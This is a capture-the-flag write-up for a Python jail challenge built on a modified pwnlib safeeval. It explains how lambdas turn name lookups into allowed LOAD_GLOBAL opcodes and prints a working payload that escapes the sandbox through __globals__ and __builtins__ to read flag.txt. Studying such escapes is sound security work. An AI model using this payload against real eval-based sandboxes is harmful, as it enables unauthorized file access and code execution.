# Turing-complete safeeval

```
score: 110
solved: xx/27
difficulty: easy
tags: jail, python
```

## Problem

Hey! We just made a brand new Turing-complete calculator based on a slight modification of pwnlib.util.safeeval to allow defining functions, because otherwise it would be Turing-incomplete.
⠀
Still we are allowing only pure functions, so there is no security implication right?
Connect via
nc safeeval.sdc.tf 1337
Calculator source code
calc.py

https://github.com/acmucsd/sdctf-2022/

## Got the flag

The original pwnlib.util.safeeval allows to run some basic calculation code, which makes it safe. But the calc.py allow two more instruction "MAKE_FUNCTION" and "CALL_FUNCTION", so we can create function, and call it.

Since it not allow to use `LOAD_NAME` to load the name of function to call (so cannot open("flag.txt")). But what function has no name in Python? it's lambda. So we can create a lambda, then do things we want inside the lambda.

Outside of function, `__import__("os")` is `LOAD_NAME`, but inside, it is `LOAD_GLOBAL` - which is allowed.

```
>>> import dis
>>> dis.dis('''(lambda : __import__("os"))()''')
  1           0 LOAD_CONST               0 (<code object <lambda> at 0x7f7f84f32500, file "<dis>", line 1>)
              2 LOAD_CONST               1 ('<lambda>')
              4 MAKE_FUNCTION            0
              6 CALL_FUNCTION            0
              8 RETURN_VALUE

Disassembly of <code object <lambda> at 0x7f7f84f32500, file "<dis>", line 1>:
  1           0 LOAD_GLOBAL              0 (__import__)
              2 LOAD_CONST               1 ('os')
              4 CALL_FUNCTION            1
              6 RETURN_VALUE

```

Using any trick (here https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-python/bypass-python-sandboxes#no-builtins) to get needed functions (open, or import os.system)

We used this: `(lambda s: s.__globals__['__builtins__'].open("flag.txt").read())(lambda f:f)` then got the flag.
